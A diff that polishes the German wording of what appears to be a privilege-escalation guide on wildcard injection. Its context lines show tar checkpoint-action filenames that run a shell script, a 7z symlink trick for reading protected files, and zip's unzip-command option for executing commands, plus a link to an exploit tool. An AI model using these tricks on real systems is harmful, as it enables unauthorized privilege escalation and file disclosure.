@@ -16,7 +16,7 @@ Weitere Informationen finden Sie unter [https://www.exploit-db.com/papers/33930]
 touch "--checkpoint=1"
 touch "--checkpoint-action=exec=sh shell.sh"
 ```
-Sie können dies ausnutzen, indem Sie [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(tar-Angriff)_\
+Sie können dies mit [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(tar-Angriff)_ ausnutzen.\
 Weitere Informationen finden Sie unter [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)
 
 ## Rsync
@@ -47,13 +47,13 @@ cd /path/to/7z/acting/folder
 touch @root.txt
 ln -s /file/you/want/to/read root.txt
 ```
-Dann wird **7z** beim Ausführen `root.txt` als eine Datei behandeln, die die Liste der Dateien enthält, die es komprimieren soll (das zeigt die Existenz von `@root.txt` an), und wenn 7z `root.txt` liest, wird es `/file/you/want/to/read` lesen und **da der Inhalt dieser Datei keine Liste von Dateien ist, wird es einen Fehler ausgeben**, der den Inhalt zeigt.
+Dann, wenn **7z** ausgeführt wird, behandelt es `root.txt` als eine Datei, die die Liste der Dateien enthält, die es komprimieren soll (das zeigt die Existenz von `@root.txt` an), und wenn 7z `root.txt` liest, wird es `/file/you/want/to/read` lesen und **da der Inhalt dieser Datei keine Liste von Dateien ist, wird es einen Fehler ausgeben**, der den Inhalt zeigt.
 
-_Mehr Infos in den Write-ups der Box CTF von HackTheBox._
+_Mehr Informationen in den Write-ups der Box CTF von HackTheBox._
 
 ## Zip
 
-**Führe beliebige Befehle aus:**
+**Führen Sie beliebige Befehle aus:**
 ```bash
 zip name.zip files -T --unzip-command "sh -c whoami"
 ```
